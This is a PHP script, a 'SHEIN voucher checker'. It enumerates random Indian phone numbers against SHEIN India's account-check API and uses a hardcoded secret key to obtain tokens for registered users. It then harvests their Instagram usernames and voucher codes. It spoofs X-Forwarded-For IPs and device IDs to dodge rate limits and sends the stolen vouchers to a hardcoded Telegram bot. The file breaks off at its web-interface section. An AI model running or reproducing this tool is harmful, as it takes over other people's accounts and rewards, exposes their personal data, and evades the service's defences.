<?php
// Telegram Bot Configuration - EDIT THESE
define('TELEGRAM_BOT_TOKEN', '8479991961:AAEWken8DazbjTaiN_DAGwTuY3Gq0-tb1Hc');
define('TELEGRAM_CHAT_ID', '1366899854');

// Global tracking to prevent duplicate numbers
$checkedNumbers = [];
$checkedNumbersFile = 'checked_numbers.json';

// New files for saving results
$registeredNumbersFile = 'registered_numbers.txt';
$voucherNumbersFile = 'voucher_numbers.txt';
$allResultsFile = 'all_results.json';

// Retry configuration
define('MAX_RETRIES', 3);
define('RETRY_DELAY', 1000000); // 1 second in microseconds

// Global retry queue
$retryQueue = [];

// ANSI color codes - Keep for display but will be stripped in web
define('COLOR_RESET', "\033[0m");
define('COLOR_RED', "\033[31m");
define('COLOR_GREEN', "\033[32m");
define('COLOR_YELLOW', "\033[33m");
define('COLOR_BLUE', "\033[34m");
define('COLOR_MAGENTA', "\033[35m");
define('COLOR_CYAN', "\033[36m");
define('COLOR_WHITE', "\033[37m");
define('COLOR_BOLD', "\033[1m");

// Detect environment
$isCli = (php_sapi_name() === 'cli');
$isWeb = !$isCli;

// Clear screen function (only works in CLI)
function clearScreen() {
    if (php_sapi_name() === 'cli') {
        echo "\033[2J\033[;H";
    }
    // In web, we'll use HTML/CSS instead
}

// Load previously checked numbers
function loadCheckedNumbers() {
    global $checkedNumbers, $checkedNumbersFile;
    if (file_exists($checkedNumbersFile)) {
        $checkedNumbers = json_decode(file_get_contents($checkedNumbersFile), true) ?: [];
    }
}

// Save checked number
function saveCheckedNumber($number) {
    global $checkedNumbers, $checkedNumbersFile;
    $checkedNumbers[$number] = time();
    file_put_contents($checkedNumbersFile, json_encode($checkedNumbers, JSON_PRETTY_PRINT));
}

// Save registered number
function saveRegisteredNumber($number, $username = 'N/A', $encryptedId = 'N/A') {
    global $registeredNumbersFile;
    
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Number: $number | Instagram: $username | EncryptedID: $encryptedId\n";
    
    file_put_contents($registeredNumbersFile, $entry, FILE_APPEND | LOCK_EX);
    
    $jsonFile = 'registered_numbers.json';
    $registered = [];
    if (file_exists($jsonFile)) {
        $registered = json_decode(file_get_contents($jsonFile), true) ?: [];
    }
    $registered[$number] = [
        'number' => $number,
        'username' => $username,
        'encryptedId' => $encryptedId,
        'timestamp' => $timestamp
    ];
    file_put_contents($jsonFile, json_encode($registered, JSON_PRETTY_PRINT));
}

// Save voucher number
function saveVoucherNumber($number, $voucherData) {
    global $voucherNumbersFile, $allResultsFile;
    
    $timestamp = date('Y-m-d H:i:s');
    
    $entry = "[$timestamp] Number: $number | Instagram: {$voucherData['username']} | Voucher: {$voucherData['voucher']} | Amount: ₹{$voucherData['amount']} | Expiry: {$voucherData['expiry']} | Min Purchase: ₹{$voucherData['min_purchase']}\n";
    file_put_contents($voucherNumbersFile, $entry, FILE_APPEND | LOCK_EX);
    
    $jsonFile = 'voucher_numbers.json';
    $vouchers = [];
    if (file_exists($jsonFile)) {
        $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
    }
    $vouchers[$number] = array_merge(
        ['timestamp' => $timestamp, 'number' => $number],
        $voucherData
    );
    file_put_contents($jsonFile, json_encode($vouchers, JSON_PRETTY_PRINT));
    
    $allResults = [];
    if (file_exists($allResultsFile)) {
        $allResults = json_decode(file_get_contents($allResultsFile), true) ?: [];
    }
    $allResults[] = array_merge(
        ['timestamp' => $timestamp, 'number' => $number, 'type' => 'voucher'],
        $voucherData
    );
    file_put_contents($allResultsFile, json_encode($allResults, JSON_PRETTY_PRINT));
}

// Save to retry queue - ONLY FOR REAL ERRORS
function saveToRetryQueue($number, $step, $headers, $retryCount = 0, $encryptedId = null, $errorReason = '') {
    global $retryQueue;
    
    $retryQueue[] = [
        'number' => $number,
        'step' => $step,
        'headers' => $headers,
        'retryCount' => $retryCount + 1,
        'lastAttempt' => time(),
        'encryptedId' => $encryptedId,
        'errorReason' => $errorReason
    ];
    
    // Save retry queue to file for persistence
    $retryFile = 'retry_queue.json';
    file_put_contents($retryFile, json_encode($retryQueue, JSON_PRETTY_PRINT));
    
    // Log the retry
    $logEntry = date('Y-m-d H:i:s') . " - QUEUED FOR RETRY {$retryCount}/" . MAX_RETRIES . " - Number: $number - Step: $step - Reason: $errorReason\n";
    file_put_contents('retry_log.txt', $logEntry, FILE_APPEND);
}

// Load retry queue from file
function loadRetryQueue() {
    global $retryQueue;
    $retryFile = 'retry_queue.json';
    if (file_exists($retryFile)) {
        $retryQueue = json_decode(file_get_contents($retryFile), true) ?: [];
    }
}

// Export to CSV
function exportToCSV() {
    $csvFile = 'voucher_results_' . date('Y-m-d') . '.csv';
    $jsonFile = 'voucher_numbers.json';
    
    if (file_exists($jsonFile)) {
        $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
        
        $fp = fopen($csvFile, 'w');
        fputcsv($fp, ['Timestamp', 'Phone Number', 'Instagram Username', 'Voucher Code', 'Amount', 'Min Purchase', 'Expiry Date']);
        
        foreach ($vouchers as $voucher) {
            fputcsv($fp, [
                $voucher['timestamp'],
                $voucher['number'],
                $voucher['username'],
                $voucher['voucher'],
                $voucher['amount'],
                $voucher['min_purchase'],
                $voucher['expiry']
            ]);
        }
        fclose($fp);
        return $csvFile;
    }
    return false;
}

// Display saved stats
function displaySavedStats() {
    $stats = "\n" . COLOR_BOLD . COLOR_CYAN . "📁 SAVED RESULTS SUMMARY:\n" . COLOR_RESET;
    
    $registeredCount = 0;
    if (file_exists('registered_numbers.json')) {
        $registered = json_decode(file_get_contents('registered_numbers.json'), true) ?: [];
        $registeredCount = count($registered);
    }
    
    $voucherCount = 0;
    if (file_exists('voucher_numbers.json')) {
        $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
        $voucherCount = count($vouchers);
    }
    
    global $retryQueue;
    $retryCount = count($retryQueue);
    
    $stats .= COLOR_YELLOW . "📱 Registered numbers saved: " . COLOR_GREEN . $registeredCount . COLOR_RESET . "\n";
    $stats .= COLOR_YELLOW . "🎟 Voucher numbers saved: " . COLOR_GREEN . $voucherCount . COLOR_RESET . "\n";
    $stats .= COLOR_YELLOW . "🔄 Pending retries (real errors): " . COLOR_RED . $retryCount . COLOR_RESET . "\n";
    
    echo $stats;
}

// Send message to Telegram
function sendTelegramMessage($message) {
    if (TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID == 'YOUR_CHAT_ID') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Generate complete phone number
function generateCompleteNumber($input) {
    $input = preg_replace('/[^0-9]/', '', $input);
    $inputLength = strlen($input);
    
    if ($inputLength >= 10) {
        return $input;
    }
    
    $digitsNeeded = 10 - $inputLength;
    $randomDigits = '';
    for ($i = 0; $i < $digitsNeeded; $i++) {
        $randomDigits .= rand(0, 9);
    }
    
    return $input . $randomDigits;
}

function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => $returnHeaders,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 15
    ]);
    
    if (strtoupper($method) === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    return [
        'content' => $output, 
        'http_code' => $httpCode,
        'curl_error' => $curlError
    ];
}

function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

function genDeviceId() { 
    return bin2hex(random_bytes(8)); 
}

// Check if response is a real error that needs retry
function isRealError($response) {
    // Connection error
    if (!empty($response['curl_error'])) {
        return true;
    }
    
    // Empty response
    if (empty($response['content'])) {
        return true;
    }
    
    $httpCode = $response['http_code'];
    
    // Server errors (5xx) - retry
    if ($httpCode >= 500 && $httpCode < 600) {
        return true;
    }
    
    // Rate limiting (429) - retry
    if ($httpCode == 429) {
        return true;
    }
    
    // Timeout (408) - retry
    if ($httpCode == 408) {
        return true;
    }
    
    // Bad gateway/gateway timeout - retry
    if ($httpCode == 502 || $httpCode == 503 || $httpCode == 504) {
        return true;
    }
    
    // Invalid JSON response
    if (!empty($response['content'])) {
        json_decode($response['content']);
        if (json_last_error() !== JSON_ERROR_NONE) {
            return true;
        }
    }
    
    return false;
}

// Async Response Handler with Retry Support
class AsyncResponseHandler {
    private $multiHandle;
    private $requests = [];
    private $running = true;
    
    public function __construct() {
        $this->multiHandle = curl_multi_init();
    }
    
    public function addRequest($id, $ch, $number, $step, $ip, $dataPreview, $retryCount = 0, $encryptedId = null) {
        curl_multi_add_handle($this->multiHandle, $ch);
        
        $this->requests[(int)$ch] = [
            'handle' => $ch,
            'number' => $number,
            'step' => $step,
            'ip' => $ip,
            'data_preview' => $dataPreview,
            'time' => time(),
            'retryCount' => $retryCount,
            'encryptedId' => $encryptedId
        ];
        
        return $ch;
    }
    
    public function checkResponses($displayManager, $access_token) {
        $active = null;
        do {
            $status = curl_multi_exec($this->multiHandle, $active);
            
            while ($done = curl_multi_info_read($this->multiHandle)) {
                $ch = $done['handle'];
                $key = (int)$ch;
                
                if (isset($this->requests[$key])) {
                    $request = $this->requests[$key];
                    $content = curl_multi_getcontent($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $error = curl_error($ch);
                    
                    $responseData = [
                        'content' => $content,
                        'http_code' => $httpCode,
                        'curl_error' => $error
                    ];
                    
                    $this->processResponse($responseData, $request['number'], $request['step'], $displayManager, $access_token, $request['retryCount'], $request['encryptedId']);
                    
                    curl_multi_remove_handle($this->multiHandle, $ch);
                    curl_close($ch);
                    unset($this->requests[$key]);
                }
            }
            
            if ($status > 0) break;
            curl_multi_select($this->multiHandle, 0.01);
            
        } while ($active > 0 && $this->running);
    }
    
    private function processResponse($response, $number, $step, $displayManager, $access_token, $retryCount = 0, $encryptedId = null) {
        $content = $response['content'];
        $httpCode = $response['http_code'];
        $error = $response['curl_error'];
        
        // Check if it's a REAL error that needs retry
        if (isRealError($response)) {
            $errorReason = '';
            if (!empty($error)) {
                $errorReason = "CURL Error: $error";
            } elseif ($httpCode >= 500) {
                $errorReason = "Server Error: HTTP $httpCode";
            } elseif (empty($content)) {
                $errorReason = "Empty Response";
            } else {
                $errorReason = "Invalid Response";
            }
            
            if ($retryCount < MAX_RETRIES) {
                // Save to retry queue - ONLY FOR REAL ERRORS
                saveToRetryQueue($number, $step, null, $retryCount, $encryptedId, $errorReason);
                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, $errorReason);
                return;
            } else {
                // Max retries reached, mark as error
                $displayManager->addReceived($number, 'error', null, 0, $errorReason);
                saveCheckedNumber($number); // Mark as checked to avoid infinite loops
                
                // Log the failure
                $logEntry = date('Y-m-d H:i:s') . " - FAILED after $retryCount retries - Number: $number - Step: $step - HTTP: $httpCode - Error: $errorReason\n";
                file_put_contents('failed_numbers.txt', $logEntry, FILE_APPEND);
                return;
            }
        }
        
        // If we get here, it's a valid response (even if it's "not registered")
        $j = json_decode($content, true);
        
        if ($step == "account_check") {
            if (isset($j['success']) && $j['success'] === false) {
                // NOT REGISTERED - This is NOT an error, don't retry
                $displayManager->addReceived($number, 'not_registered');
                saveCheckedNumber($number);
            } elseif (isset($j['encryptedId'])) {
                // REGISTERED - Success!
                $displayManager->addReceived($number, 'registered');
                saveRegisteredNumber($number, 'N/A', $j['encryptedId']);
                $this->continueProcessing($number, $j['encryptedId'], $displayManager, $access_token);
            } else {
                // Unexpected response format - treat as error and retry
                if ($retryCount < MAX_RETRIES) {
                    saveToRetryQueue($number, $step, null, $retryCount, $encryptedId, 'Missing encryptedId in response');
                    $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'Missing encryptedId');
                } else {
                    $displayManager->addReceived($number, 'error');
                    saveCheckedNumber($number);
                }
            }
        } elseif ($step == "token_gen") {
            $this->processTokenResponse($content, $number, $displayManager, $retryCount);
        } elseif ($step == "user_data") {
            $this->processUserDataResponse($content, $number, $displayManager, $retryCount);
        }
    }
    
    private function continueProcessing($number, $encryptedId, $displayManager, $access_token) {
        $ip = randIp();
        $adId = genDeviceId();
        
        $displayManager->addSent($number, 'token_gen', $ip, "getting token");
        
        $payload = json_encode([
            "client_type" => "Android/29",
            "client_version" => "1.0.8",
            "gender" => "",
            "phone_number" => $number,
            "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id" => $encryptedId,
            "user_name" => ""
        ]);
        
        $headers = [
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "Content-Type: application/json; charset=UTF-8",
            "X-Forwarded-For: $ip"
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 15
        ]);
        
        $this->addRequest($number, $ch, $number, 'token_gen', $ip, "token request", 0, $encryptedId);
    }
    
    public function processTokenResponse($content, $number, $displayManager, $retryCount = 0) {
        $j = json_decode($content, true);
        
        if (!empty($j['access_token'])) {
            $sheinverse_token = $j['access_token'];
            $displayManager->addReceived($number, 'token_obtained');
            
            $ip = randIp();
            $adId = genDeviceId();
            
            $displayManager->addSent($number, 'user_data', $ip, "getting profile");
            
            $headers = [
                "Host: shein-creator-backend-151437891745.asia-south1.run.app",
                "Authorization: Bearer " . $sheinverse_token,
                "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36",
                "Accept: */*",
                "Origin: https://sheinverse.galleri5.com",
                "X-Requested-With: com.ril.shein",
                "Referer: https://sheinverse.galleri5.com/",
                "Content-Type: application/json",
                "X-Forwarded-For: $ip"
            ];
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user",
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => 'gzip',
                CURLOPT_CONNECTTIMEOUT => 5,
                CURLOPT_TIMEOUT => 15
            ]);
            
            $this->addRequest($number, $ch, $number, 'user_data', $ip, "user data", 0);
        } else {
            // No access token - retry if under limit
            if ($retryCount < MAX_RETRIES) {
                saveToRetryQueue($number, 'token_gen', null, $retryCount, null, 'No access token in response');
                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'No token');
            } else {
                $displayManager->addReceived($number, 'error');
                saveCheckedNumber($number);
            }
        }
    }
    
    public function processUserDataResponse($content, $number, $displayManager, $retryCount = 0) {
        $decoded = json_decode($content, true);
        
        if (isset($decoded['user_data']['instagram_data']['username'])) {
            $username = $decoded['user_data']['instagram_data']['username'];
            $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
            $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
            $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
            $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
            
            saveCheckedNumber($number);
            
            $voucherData = [
                'time' => time(),
                'number' => $number,
                'username' => $username,
                'voucher' => $voucher,
                'amount' => $voucher_amount,
                'min_purchase' => $min_purchase_amount,
                'expiry' => $expiry_date
            ];
            
            saveVoucherNumber($number, $voucherData);
            $displayManager->addReceived($number, 'success', $voucherData);
            
            if (TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN') {
                $telegramMsg = "<b>✅ SHEIN Voucher Found!</b>\n\n";
                $telegramMsg .= "📞 <b>Number:</b> {$number}\n";
                $telegramMsg .= "📸 <b>Instagram:</b> {$username}\n";
                $telegramMsg .= "🎟 <b>Voucher Code:</b> <code>{$voucher}</code>\n";
                $telegramMsg .= "💰 <b>Amount:</b> ₹{$voucher_amount}\n";
                $telegramMsg .= "🛍 <b>Min Purchase:</b> ₹{$min_purchase_amount}\n";
                $telegramMsg .= "⏰ <b>Expiry:</b> {$expiry_date}";
                sendTelegramMessage($telegramMsg);
            }
        } else {
            // No user data - retry if under limit
            if ($retryCount < MAX_RETRIES) {
                saveToRetryQueue($number, 'user_data', null, $retryCount, null, 'No user data in response');
                $displayManager->addReceived($number, 'retry', null, $retryCount + 1, 'No user data');
            } else {
                $displayManager->addReceived($number, 'error');
                saveCheckedNumber($number);
            }
        }
    }
    
    public function __destruct() {
        $this->running = false;
        curl_multi_close($this->multiHandle);
    }
}

// Display manager
class DisplayManager {
    public $sentWindow = [];
    public $receivedWindow = [];
    public $vouchersFound = [];
    public $stats = [
        'total_processed' => 0,
        'not_registered' => 0,
        'registered' => 0,
        'vouchers' => 0,
        'errors' => 0,
        'retries' => 0
    ];
    
    public function addSent($number, $step, $ip, $dataPreview) {
        $this->sentWindow[] = [
            'time' => date('H:i:s'),
            'number' => $number,
            'step' => $step,
            'ip' => $ip,
            'data' => $dataPreview
        ];
        
        if (count($this->sentWindow) > 15) {
            array_shift($this->sentWindow);
        }
        $this->render();
    }
    
    public function addReceived($number, $status, $voucherData = null, $retryCount = 0, $errorReason = '') {
        $entry = [
            'time' => date('H:i:s'),
            'number' => $number,
            'status' => $status,
            'retryCount' => $retryCount,
            'errorReason' => $errorReason
        ];
        
        if ($voucherData) {
            $entry['voucher'] = $voucherData['voucher'] ?? 'N/A';
            $entry['amount'] = $voucherData['amount'] ?? 'N/A';
            $entry['username'] = $voucherData['username'] ?? 'N/A';
            $entry['expiry'] = $voucherData['expiry'] ?? '';
        }
        
        $this->receivedWindow[] = $entry;
        
        if (count($this->receivedWindow) > 15) {
            array_shift($this->receivedWindow);
        }
        
        $this->stats['total_processed']++;
        
        if ($status == 'success') {
            $this->stats['vouchers']++;
            if ($voucherData) {
                $this->vouchersFound[] = $voucherData;
            }
        } elseif ($status == 'not_registered') {
            $this->stats['not_registered']++;
        } elseif ($status == 'registered' || $status == 'token_obtained') {
            $this->stats['registered']++;
        } elseif ($status == 'retry') {
            $this->stats['retries']++;
        } else {
            $this->stats['errors']++;
        }
        
        $this->render();
    }
    
    public function render() {
        // In CLI mode, clear screen and show formatted output
        if (php_sapi_name() === 'cli') {
            clearScreen();
            
            // Header
            echo COLOR_BOLD . COLOR_CYAN . "╔════════════════════════════════════════════════════════════════════════════════════════════════════╗\n";
            echo "║                 SHEIN VOUCHER CHECKER - RETRY ONLY REAL ERRORS (MAX " . MAX_RETRIES . " attempts)                 ║\n";
            echo "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝\n" . COLOR_RESET;
            
            // Stats bar
            echo "\n" . COLOR_BOLD . COLOR_YELLOW . "📊 STATS: " . COLOR_RESET;
            echo "Sent: " . COLOR_GREEN . $this->stats['total_processed'] . COLOR_RESET . " | ";
            echo "Not Registered: " . COLOR_RED . $this->stats['not_registered'] . COLOR_RESET . " | ";
            echo "Registered: " . COLOR_BLUE . $this->stats['registered'] . COLOR_RESET . " | ";
            echo "Vouchers: " . COLOR_GREEN . $this->stats['vouchers'] . COLOR_RESET . " | ";
            echo "Retries: " . COLOR_YELLOW . $this->stats['retries'] . COLOR_RESET . " | ";
            echo "Errors: " . COLOR_RED . $this->stats['errors'] . COLOR_RESET . "\n\n";
            
            // Headers for both windows
            printf(COLOR_BOLD . COLOR_WHITE . "┌───────────────────────── SENT REQUESTS (15 latest) ─────────────────────────┐    ┌──────────────────────── RECEIVED RESPONSES (15 latest) ────────────────────────┐\n" . COLOR_RESET);
            printf(COLOR_BOLD . COLOR_WHITE . "│ %-8s │ %-11s │ %-8s │ %-15s │ %-20s │    │ %-8s │ %-11s │ %-25s │ %-15s │ %-10s │\n" . COLOR_RESET, 
                   "TIME", "NUMBER", "STEP", "IP", "DATA", "TIME", "NUMBER", "STATUS/REASON", "VOUCHER", "AMOUNT");
            printf(COLOR_BOLD . COLOR_WHITE . "├──────────┼─────────────┼──────────┼─────────────────┼──────────────────────┤    ├──────────┼─────────────┼───────────────────────────┼─────────────────┼────────────┤\n" . COLOR_RESET);
            
            // Display both windows side by side
            $maxRows = max(count($this->sentWindow), count($this->receivedWindow), 15);
            
            for ($i = 0; $i < $maxRows; $i++) {
                // Sent column
                echo COLOR_BOLD . COLOR_WHITE . "│" . COLOR_RESET;
                if (isset($this->sentWindow[$i])) {
                    $s = $this->sentWindow[$i];
                    $step = '';
                    switch($s['step']) {
                        case 'account_check': $step = 'ACC'; break;
                        case 'token_gen': $step = 'TOKEN'; break;
                        case 'user_data': $step = 'USER'; break;
                        default: $step = substr($s['step'], 0, 6);
                    }
                    
                    $ip_short = substr($s['ip'], strrpos($s['ip'], '.') + 1);
                    $ip_display = "*.*.*." . $ip_short;
                    
                    printf(" %-8s │ %-11s │ %-8s │ %-15s │ %-20s ", 
                        COLOR_CYAN . $s['time'] . COLOR_RESET,
                        COLOR_YELLOW . $s['number'] . COLOR_RESET,
                        COLOR_BLUE . $step . COLOR_RESET,
                        COLOR_MAGENTA . $ip_display . COLOR_RESET,
                        COLOR_WHITE . substr($s['data'], 0, 20) . COLOR_RESET
                    );
                } else {
                    echo str_repeat(" ", 83) . " ";
                }
                
                echo COLOR_BOLD . COLOR_WHITE . "│    │" . COLOR_RESET;
                
                // Received column
                if (isset($this->receivedWindow[$i])) {
                    $r = $this->receivedWindow[$i];
                    
                    printf(" %-8s │ %-11s │ ", 
                        COLOR_CYAN . $r['time'] . COLOR_RESET,
                        COLOR_YELLOW . $r['number'] . COLOR_RESET
                    );
                    
                    if ($r['status'] == 'success') {
                        printf(COLOR_GREEN . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            "✅ VOUCHER FOUND",
                            COLOR_MAGENTA . ($r['voucher'] ?? 'N/A') . COLOR_RESET,
                            COLOR_GREEN . "₹" . ($r['amount'] ?? 'N/A') . COLOR_RESET
                        );
                    } elseif ($r['status'] == 'not_registered') {
                        printf(COLOR_RED . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            "❌ NOT REGISTERED",
                            "N/A",
                            "N/A"
                        );
                    } elseif ($r['status'] == 'registered') {
                        printf(COLOR_BLUE . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            "📱 REGISTERED - SAVED",
                            "CHECKING...",
                            "N/A"
                        );
                    } elseif ($r['status'] == 'token_obtained') {
                        printf(COLOR_BLUE . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            "🔑 TOKEN OK",
                            "FETCHING...",
                            "N/A"
                        );
                    } elseif ($r['status'] == 'retry') {
                        $retryText = "🔄 RETRY (" . $r['retryCount'] . "/" . MAX_RETRIES . ")";
                        $reason = isset($r['errorReason']) ? " - " . $r['errorReason'] : "";
                        printf(COLOR_YELLOW . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            $retryText,
                            "WAITING...",
                            "N/A"
                        );
                    } else {
                        $errorText = "⚠ ERROR";
                        $reason = isset($r['errorReason']) ? $r['errorReason'] : "";
                        printf(COLOR_RED . "%-25s" . COLOR_RESET . " │ %-15s │ %-10s ", 
                            $errorText,
                            "N/A",
                            "N/A"
                        );
                    }
                } else {
                    echo str_repeat(" ", 83) . " ";
                }
                
                echo COLOR_BOLD . COLOR_WHITE . "│\n" . COLOR_RESET;
            }
            
            // Bottom border
            printf(COLOR_BOLD . COLOR_WHITE . "└──────────┴─────────────┴──────────┴─────────────────┴──────────────────────┘    └──────────┴─────────────┴───────────────────────────┴─────────────────┴────────────┘\n" . COLOR_RESET);
            
            // Recent vouchers section
            if (!empty($this->vouchersFound)) {
                echo "\n" . COLOR_BOLD . COLOR_GREEN . "🎟 RECENT VOUCHERS FOUND & SAVED (" . count($this->vouchersFound) . " total):\n" . COLOR_RESET;
                echo "┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n";
                echo "│ " . COLOR_BOLD . "   TIME    │   NUMBER    │   INSTAGRAM          │   VOUCHER CODE   │   AMOUNT   │   EXPIRY      " . COLOR_RESET . " │\n";
                echo "├───────────┼─────────────┼──────────────────────┼──────────────────┼────────────┼───────────────┤\n";
                
                $recentVouchers = array_slice($this->vouchersFound, -3);
                foreach ($recentVouchers as $v) {
                    printf("│ %s │ %s │ %-20s │ %-16s │ ₹%-8s │ %-13s │\n",
                        COLOR_CYAN . date('H:i:s', $v['time'] ?? time()) . COLOR_RESET,
                        COLOR_YELLOW . $v['number'] . COLOR_RESET,
                        COLOR_GREEN . "@" . substr($v['username'], 0, 18) . COLOR_RESET,
                        COLOR_MAGENTA . $v['voucher'] . COLOR_RESET,
                        COLOR_GREEN . $v['amount'] . COLOR_RESET,
                        COLOR_WHITE . substr($v['expiry'], 0, 13) . COLOR_RESET
                    );
                }
                echo "└───────────┴─────────────┴──────────────────────┴──────────────────┴────────────┴───────────────┘\n";
            }
            
            // Status line
            echo "\n" . COLOR_YELLOW . "⏳ Sending requests sequentially with 200ms delay" . COLOR_RESET . "\n";
            echo COLOR_CYAN . "📱 Each request uses unique IP - Press Ctrl+C to stop" . COLOR_RESET . "\n";
            echo COLOR_GREEN . "💾 Registered numbers are being saved to: registered_numbers.txt/json" . COLOR_RESET . "\n";
            echo COLOR_GREEN . "💾 Voucher numbers are being saved to: voucher_numbers.txt/json" . COLOR_RESET . "\n";
            echo COLOR_YELLOW . "🔄 Only REAL ERRORS are retried (timeouts, 5xx, empty responses) - NOT 'Not Registered'" . COLOR_RESET . "\n";
        } else {
            // In web mode, we'll just output JSON or simple text
            // You can customize this based on your needs
            echo json_encode([
                'stats' => $this->stats,
                'recent_vouchers' => array_slice($this->vouchersFound, -5)
            ]);
        }
    }
}

// Process retry queue
function processRetryQueue($responseHandler, $displayManager, $access_token) {
    global $retryQueue;
    
    $now = time();
    $processed = [];
    
    foreach ($retryQueue as $index => $retry) {
        // Wait at least RETRY_DELAY before retrying
        if ($now - $retry['lastAttempt'] >= RETRY_DELAY / 1000000) {
            $ip = randIp();
            $adId = genDeviceId();
            
            $displayManager->addSent($retry['number'], $retry['step'] . '_retry', $ip, "retry {$retry['retryCount']}/" . MAX_RETRIES);
            
            if ($retry['step'] == 'account_check') {
                $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
                $headers = [
                    "Authorization: Bearer $access_token",
                    "Requestid: account_check",
                    "X-Tenant: B2C",
                    "Accept: application/json",
                    "User-Agent: Android",
                    "Client_type: Android/29",
                    "Client_version: 1.0.8",
                    "X-Tenant-Id: SHEIN",
                    "Ad_id: $adId",
                    "Content-Type: application/x-www-form-urlencoded",
                    "X-Forwarded-For: $ip"
                ];
                
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_HTTPHEADER => $headers,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => "mobileNumber={$retry['number']}",
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => 'gzip',
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_TIMEOUT => 15
                ]);
                
                $responseHandler->addRequest($retry['number'], $ch, $retry['number'], 'account_check', $ip, "retry {$retry['retryCount']}", $retry['retryCount'], $retry['encryptedId']);
            } elseif ($retry['step'] == 'token_gen') {
                // Handle token_gen retry - similar implementation
                // You can add token_gen retry logic here if needed
            } elseif ($retry['step'] == 'user_data') {
                // Handle user_data retry - similar implementation
                // You can add user_data retry logic here if needed
            }
            
            $processed[] = $index;
            
            // Log retry attempt
            $logEntry = date('Y-m-d H:i:s') . " - RETRYING {$retry['retryCount']}/" . MAX_RETRIES . " - Number: {$retry['number']} - Step: {$retry['step']}\n";
            file_put_contents('retry_log.txt', $logEntry, FILE_APPEND);
        }
    }
    
    // Remove processed retries
    foreach ($processed as $index) {
        unset($retryQueue[$index]);
    }
    
    $retryQueue = array_values($retryQueue);
    
    // Save updated queue
    file_put_contents('retry_queue.json', json_encode($retryQueue, JSON_PRETTY_PRINT));
}

// ============================================================================
// WEB INTERFACE - This runs when accessed via browser
// ============================================================================
if ($isWeb) {
    // Start output buffering to capture any CLI output
    ob_start();
    
    // Check if form was submitted
    $baseNumber = '';
